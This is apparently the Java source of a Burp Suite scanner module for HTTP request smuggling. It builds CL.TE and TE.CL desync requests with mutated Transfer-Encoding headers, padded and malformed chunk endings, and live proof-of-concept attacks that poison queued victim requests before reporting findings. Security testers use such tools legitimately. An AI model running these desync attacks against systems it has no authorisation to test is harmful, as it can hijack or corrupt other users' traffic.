package burp;

import org.apache.commons.lang3.tuple.Pair;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.*;
import java.util.zip.GZIPOutputStream;

import static burp.ChunkContentScan.getCLTEAttack;
import static burp.ChunkContentScan.getTECLAttack;

public abstract class SmuggleScanBox extends Scan {

    SmuggleScanBox(String name) {
        super(name);
        DesyncBox.sharedSettings.register("convert GET to POST", true);
        DesyncBox.sharedSettings.register("force method name", "");
        DesyncBox.sharedSettings.register("globally swap - with _", false);
        DesyncBox.sharedSettings.register("strip CL", false);
        DesyncBox.sharedSettings.register("skip vulnerable hosts", false);
        DesyncBox.sharedSettings.register("pad everything", false);
        DesyncBox.sharedSettings.register("skip obsolete permutations", true);
        DesyncBox.sharedSettings.register("ignore probable FPs", true);
        DesyncBox.sharedSettings.register("collab-domain", Utilities.generateCanary()+".burpcollaborator.net");

        DesyncBox.h1Settings.register("skip straight to poc", false);
        DesyncBox.h1Settings.register("poc: G", false);
        DesyncBox.h1Settings.register("poc: FOO", false);
        DesyncBox.h1Settings.register("poc: headerConcat", false);
        DesyncBox.h1Settings.register("poc: bodyConcat", false);
        DesyncBox.h1Settings.register("poc: collab", false);
        DesyncBox.h1Settings.register("poc: collab-header", false);
        DesyncBox.h1Settings.register("poc: collab-XFO-header", false);
        DesyncBox.h1Settings.register("poc: collab-abs", false);
        DesyncBox.h1Settings.register("poc: collab-at", false);
        DesyncBox.h1Settings.register("poc: collab-blind", false);
        //DesyncBox.h1Settings.register("use turbo for autopoc", true);
        DesyncBox.h1Settings.register("only report exploitable", false);
        DesyncBox.h1Settings.register("risky mode", false);
        
        DesyncBox.h2Settings.register("h2: swap CRLF with LF", false);
        scanSettings.importSettings(DesyncBox.sharedSettings);
        scanSettings.importSettings(DesyncBox.sharedPermutations);
        //Utilities.globalSettings.registerSetting("report dodgy findings", false);
        //DesyncBox.sharedSettings.register();
    }

    byte[] setupRequest(byte[] baseReq) {
        if (baseReq[0] == 'G') {
            if (Utilities.globalSettings.getBoolean("convert GET to POST")) {
                baseReq = Utilities.helpers.toggleRequestMethod(baseReq);
            }
            else {
                baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Type", "application/x-www-form-urlencoded");
                baseReq = Utilities.addOrReplaceHeader(baseReq, "Content-Length", "0");
            }
        }

        String forceMethodName = Utilities.globalSettings.getString("force method name");
        if (!"".equals(forceMethodName)) {
            baseReq = Utilities.setMethod(baseReq, forceMethodName);
        }

        return baseReq;
    }

    boolean suspectedFalsePositive(String permutation, Resp response) {
        if (!Utilities.globalSettings.getBoolean("ignore probable FPs")) {
            return false;
        }

        switch(permutation) {
            case "h2space":
                return Utilities.contains(response, "X-Amz-Cf-");
        }

        return false;
    }

    @Override
    protected List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        HashMap<String, Boolean> config;

        ArrayList<String> relevantPermutations = new ArrayList<>();
        for (String permutation: DesyncBox.supportedPermutations) {
            if (!scanSettings.contains(permutation)) {
                continue;
            }
            relevantPermutations.add(permutation);
        }


        ArrayList<String> validPermutations = new ArrayList<>();
        for (String permutation: relevantPermutations) {
            String key = permutation+service.getProtocol()+service.getHost();
            if (BurpExtender.hostsToSkip.containsKey(key)) {
                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
                    return null;
                }
                else if (Utilities.globalSettings.getBoolean("skip obsolete permutations")) {
                    validPermutations.add(permutation);
                }
            }
        }

        if (validPermutations.isEmpty()) {
            validPermutations.addAll(relevantPermutations);
        }

        for (String permutation: validPermutations) {
            if (!Utilities.globalSettings.getBoolean(permutation)) {
                continue;
            }
            config = new HashMap<>();
            config.put(permutation, true);
            boolean worked = doConfiguredScan(baseReq, service, config);
            if (worked) {
                String key = permutation+service.getProtocol()+service.getHost();
                BurpExtender.hostsToSkip.putIfAbsent(key, true);
                if (Utilities.globalSettings.getBoolean("skip obsolete permutations")) {
                    break;
                }
            }
        }
        return null;
    }

    abstract boolean doConfiguredScan(byte[] baseReq, IHttpService service, HashMap<String, Boolean> config);


    Resp leftAlive(byte[] req, IHttpService service) {
        byte[] keepalive = Utilities.addOrReplaceHeader(req, "Connection", "keep-alive");
        Resp resp = request(service, keepalive, 0, true);
        String connectionType = Utilities.getHeader(resp.getReq().getResponse(), "Connection");
        if (connectionType.toLowerCase().contains("alive")) {
            return resp;
        }
        return null;
    }

    static Resp buildPoc(byte[] req, IHttpService service, HashMap<String, Boolean> config) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0, config, false);

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());

            // first request ends here
            buf.write(makeChunked(req, 0, 0, config, false));
            return new Resp(new Req(buf.toByteArray(), null, service), System.currentTimeMillis());
        }
        catch (IOException e) {
            throw new RuntimeException();
        }
    }

    static byte[] gzipBody(byte[] baseReq) {
        try {
            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
            String body = Utilities.getBody(req);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(out);
            gzip.write(Utilities.helpers.stringToBytes(body));
            gzip.close();
            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
        } catch (Exception e) {
            Utilities.err(e.getMessage());
            return baseReq;
        }
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        HashMap<String, Boolean> settings = new HashMap<>();
        settings.put("vanilla", true);
        return makeChunked(baseReq, contentLengthOffset, chunkOffset, settings, false);
    }

    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset, HashMap<String, Boolean> settings, boolean malformedClose) {
        if (!Utilities.containsBytes(baseReq, "Transfer-Encoding".getBytes())) {
            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "chunked");
        }

        String technique = settings.keySet().iterator().next();
        byte[] chunkedReq = DesyncBox.applyDesync(baseReq, "Transfer-Encoding", technique);

        if (Utilities.globalSettings.getBoolean("globally swap - with _")) {
            chunkedReq = Utilities.replace(chunkedReq, "Transfer-Encoding".getBytes(), "Transfer_Encoding".getBytes());
        }

        if (Utilities.globalSettings.getBoolean("h2: swap CRLF with LF")) {
            chunkedReq = Utilities.replace(chunkedReq, "^~", "~");
        }

        String ending = "0\r\n\r\n";
        if (malformedClose) {
            if (Utilities.globalSettings.getBoolean("risky mode")) {
                ending = "1\r\nZ\r\n0\r\n\r\n";
            }
            else {
                ending = "1\r\nZ\r\nQ\r\n\r\n";
            }
        }

        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);

        // this prevents some FPs
        if ("".equals(body)) {
            body = "x=y";
            bodySize += 3;
        }

        // concept by @webtonull
        if (Utilities.globalSettings.getBoolean("pad everything") || settings.containsKey("chunky")) {
            String padChunk = "F\r\nAAAAAAAAAAAAAAA\r\n";
            StringBuilder fullPad = new StringBuilder();
            for (int i=0; i<3000; i++) {
                fullPad.append(padChunk);
            }
            ending = fullPad.toString() + ending;
            //bodySize += 8; // fixme hmm
        }

        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n"+ending);
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, ending);
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        String newContentLength = Integer.toString(bodySize+contentLengthOffset);

        try {
            chunkedReq = Utilities.addOrReplaceHeader(chunkedReq, "Content-Length", newContentLength);
            if (settings.containsKey("reversevanilla")) {
                chunkedReq = Utilities.replace(chunkedReq, "Content-Length", "oldContentLength");
                chunkedReq = Utilities.addOrReplaceHeader(chunkedReq, "Content-Length", newContentLength);
            }
        } catch (RuntimeException e) {
            // throws if CL isn't present, not a big issue
        }

        if (Utilities.globalSettings.getBoolean("strip CL")) {
            chunkedReq = Utilities.replace(chunkedReq, "Content-Length", "fakecontentlength");
        }

        // fixme breaks stuff
//        if (settings.containsKey("underscore2")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Content-Length".getBytes(), "Content_Length".getBytes());
//        }
//        else if (settings.containsKey("space2")) {
//            chunkedReq = Utilities.replace(chunkedReq, "Content-Length".getBytes(), "Content-Length ".getBytes());
//        }

        return chunkedReq;
    }


//    static boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service) {
//        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service, new HashMap<>());
//    }
//
//    static boolean sendPoc(String name, byte[] setupAttack, byte[] victim, IHttpService service, HashMap<String, Boolean> config) {
//        return sendPoc(name, Utilities.helpers.bytesToString(setupAttack), victim, service, config);
//    }


    static boolean launchPoc(byte[] base, String name, boolean CLTE, boolean reuseConnection, String inject, IHttpService service, HashMap<String, Boolean> config) {
        Pair<String, Integer> attack;
        if (CLTE ) {
            attack = getCLTEAttack(base, inject, config);
        } else {
            attack = getTECLAttack(base, inject, config);
        }
        byte[] victim = makeChunked(base, 0, 0, config, false);
        String victimString = Utilities.helpers.bytesToString(victim);

        String setupAttack = attack.getLeft();

        if ("collab-blind".equals(name)) {
            request(service, setupAttack.getBytes(), 0, true);
            return false;
        }

        if (reuseConnection) {

            int pauseTime = 4000;
            SmuggleHelper helper = new SmuggleHelper(service, reuseConnection);
            helper.queue(setupAttack, attack.getRight(), pauseTime);
            helper.queue(setupAttack);
            List<Resp> results = helper.waitFor();
            Resp pauseReq = results.get(0);
            Resp poisonedReq = results.get(1);
            if (pauseReq.failed() || poisonedReq.failed() || pauseReq.getStatus() == poisonedReq.getStatus()) {
                return false;
            }
            int pauseCode = pauseReq.getStatus();

            // confirm pause doesn't affect status
            helper = new SmuggleHelper(service, reuseConnection);
            helper.queue(setupAttack);
            helper.queue(setupAttack);
            results = helper.waitFor();
            if (results.get(0).failed() || results.get(1).failed() || results.get(0).getStatus() == results.get(1).getStatus() || results.get(0).getStatus() != pauseCode) {
                return false;
            }

            if (results.get(0).getResponseTime() + 2000 > pauseReq.getResponseTime()) {
                return false;
            }

            // confirm status diff isn't second-request-fluff
            helper = new SmuggleHelper(service, reuseConnection);
            helper.queue(victimString);
            helper.queue(setupAttack);
            results = helper.waitFor();
            int victimStatus = results.get(0).getStatus();
            if (results.get(1).getStatus() == poisonedReq.getStatus()) {
                return false;
            }

            // confirm pause-noresponse wasn't a one-off
            helper = new SmuggleHelper(service, reuseConnection);
            helper.queue(setupAttack, attack.getRight(), pauseTime);
            helper.queue(setupAttack);
            results = helper.waitFor();
            if (results.get(0).failed() || results.get(1).failed() || results.get(0).getStatus() == results.get(1).getStatus() || results.get(0).getStatus() != pauseCode) {
                return false;
            }

            helper = new SmuggleHelper(service, reuseConnection);
            for(int i=0;i<8;i++) {
                helper.queue(victimString);
            }

            String amend = " | good?";
            results = helper.waitFor();
            for (Resp result: results) {
                if (!result.failed() && result.getStatus() != victimStatus) {
                    amend = "| wobbly";
                    //Utils.out("Discounting random-status issue on "+service.getHost());
                    break;
                }
            }

            report("Connection-locked smuggling"+amend, "", pauseReq, poisonedReq);
            BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);
            return true;
        }

        try {
            Resp baseline = request(service, victim, 0, true);
            SmuggleHelper helper = new SmuggleHelper(service, reuseConnection);
            helper.queue(setupAttack); // no need to pause here right?
            helper.queue(Utilities.helpers.bytesToString(victim));
            helper.queue(Utilities.helpers.bytesToString(victim));

            List<Resp> results = helper.waitFor();
            Resp cleanup = null;
            for (int i=0;i<3;i++) {
                cleanup = request(service, victim, 0, true);
                if (cleanup.getInfo().getStatusCode() != baseline.getInfo().getStatusCode()) {
                    request(service, victim, 0, true);
                    break;
                }
            }
            int cleanupStatus = cleanup.getStatus();
            int minerStatus = results.get(0).getStatus();
            int victimStatus = results.get(1).getStatus();

            if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
                return false;
            }

            HashSet<Integer> badCodes = new HashSet<>();
            badCodes.add(0);
            badCodes.add(428);
            badCodes.add(429);
            badCodes.add(430);

            if (badCodes.contains(cleanupStatus) || badCodes.contains(minerStatus) || badCodes.contains(victimStatus)) {
                return false;
            }

            String issueTitle;
            String issueDescription = "HTTP Request Smuggler attempted a request smuggling attack, and it appeared to succeed. Please refer to the following posts for further information: <br/><a href=\"https://portswigger.net/blog/http-desync-attacks\">https://portswigger.net/blog/http-desync-attacks</a><br/><a href=\"https://portswigger.net/research/http-desync-attacks-what-happened-next\">https://portswigger.net/research/http-desync-attacks-what-happened-next</a><b/r><a href=\"https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler\">https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler</a>";

            if (minerStatus == victimStatus || cleanupStatus == minerStatus) {
                issueTitle = "HTTP Request Smuggling Confirmed";
            }
            else if (cleanupStatus == victimStatus) {
                return false;
            }
            else {
                issueTitle = "HTTP Request Smuggling maybe";
            }

            helper = new SmuggleHelper(service, reuseConnection);
            int randomCheckCount = 7;
            if (Utilities.globalSettings.getBoolean("skip straight to poc")) {
                randomCheckCount = 14;
            }

            for (int i=0; i<randomCheckCount;i++) {
                helper.queue(Utilities.helpers.bytesToString(victim));
            }
            List<Resp> cleanResults = helper.waitFor();
            for (int i=0; i<randomCheckCount;i++) {
                if (cleanResults.get(i).getStatus() != baseline.getInfo().getStatusCode()) {
                    issueTitle += " (dodgy)";
                    break;
                }
            }

            issueTitle += ": "+name + " -";

            issueTitle += String.join("|", config.keySet());

            report(issueTitle, issueDescription, cleanup, results.get(0), results.get(1));

            BurpExtender.hostsToSkip.putIfAbsent(service.getHost(), true);

            return true;
        }
        catch (Exception e) {
            Utils.out("Error during poc");
            return false;
        }
    }

}
